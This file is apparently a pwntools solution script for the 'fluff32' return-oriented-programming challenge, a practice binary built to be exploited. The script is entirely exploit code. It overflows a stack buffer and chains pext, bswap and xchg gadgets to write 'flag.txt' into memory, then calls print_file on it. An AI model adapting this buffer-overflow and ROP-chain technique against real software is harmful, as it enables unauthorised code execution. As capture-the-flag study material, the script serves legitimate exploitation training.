from pwn import *

gadget1 = 0x08048543 # mov eax, ebp ; mov ebx, 0xb0bababa ; pext edx, ebx, eax ; mov eax, 0xdeadbeef ; ret
gadget2 = 0x08048555 # xchg byte ptr [ecx], dl ; ret
gadget3 = 0x08048558 # pop ecx ; bswap ecx ; ret
pop_ebp = 0x080485bb
bss = 0x804a020
print_file = 0x080483d0

# 1011, 0000, 1011, 1010, 1011, 1010, 1011, 1010
#                         0111, 0101, 1010, 0100        (f:0x66:0x75a4)
#                         0110,0110                                   
#                         0111, 0110, 1100, 0100        (l:0x6c:0x76c4)         
#                         0111, 0101, 0100, 0110        (a:0x61:0x7546)
#                         0111, 0101, 1011, 0000        (g:0x67:0x75b0)
#                         0100, 0111, 1011, 0100        (.:0x2e:0x47b4)
#                         0111, 1111, 0100, 0000        (t:0x74:0x7f40)
#                         0111, 1011, 0100, 0100        (x:0x78:0x7b44)

# pext -> bswap -> xchg
elf = context.binary = ELF('./fluff32')
p = process()


def set_ecx(addr):
    little_bytes = p32(addr)
    inverted_addr = u32(little_bytes,endian="big")
    payload = flat(
        gadget3,
        inverted_addr,
    )
    return payload

def xchg_ecx_dl():
    payload = flat(
        gadget2
    )
    return payload

map = {
    'f': 0x75a4,
    'l': 0x76c4,
    'a': 0x7546,
    'g': 0x75b0,
    '.': 0x47b4,
    't': 0x7f40,
    'x': 0x7b44
}

def pext(ebp):
    payload = flat(
        pop_ebp,  
        ebp,
        gadget1
    )
    return payload
    
target_str = "flag.txt"
payload = b"A"*44

for i in range(len(target_str)):
    ch = target_str[i]
    payload += pext(map[ch])
    payload += set_ecx(bss+i)
    payload += xchg_ecx_dl()

payload += flat(
    print_file,
    0x0,
    bss
)

p.sendline(payload)
print(p.clean().decode('latin-1'))
p.interactive()

